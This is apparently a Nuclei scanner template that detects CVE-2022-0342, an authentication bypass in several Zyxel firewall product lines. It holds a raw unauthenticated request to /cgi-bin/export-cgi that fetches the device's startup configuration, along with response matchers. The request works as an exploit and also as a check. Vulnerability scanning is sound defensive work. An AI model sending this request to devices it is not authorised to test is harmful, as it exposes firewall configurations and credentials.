id: CVE-2022-0342

info:
  name: CVE-2022-0342 Zyxel Authentication Bypass
  author: SleepingBag945
  severity: critical
  description: Zyxel USG/ZyWALL是中国合勤科技（Zyxel）公司的一款防火墙。ZyWALL 4.20版本至4.70版本、USG FLEX 4.50版本至5.20版本、ATP 4.32版本至5.20版本、VPN 4.30版本至5.20版本、NSG 1.20版本至1.33 Patch 4版本存在安全漏洞，攻击者利用该漏洞绕过Web身份验证并获得设备的管理访问权限。
  tags: zyxel


http:
  - raw:
      - |
        GET /cgi-bin/export-cgi?category=config&arg0=startup-config.conf HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
        Accept-Encoding: gzip, deflate
        Connection: close





    matchers-condition: and
    matchers:
      - type: word
        words:
          - "interface-name"
        condition: and

      - type: word
        words:
          - "text/zyxel"
        part: header
        condition: and

      - type: status
        status:
          - 200

# https://security.humanativaspa.it/zyxel-authentication-bypass-patch-analysis-cve-2022-0342/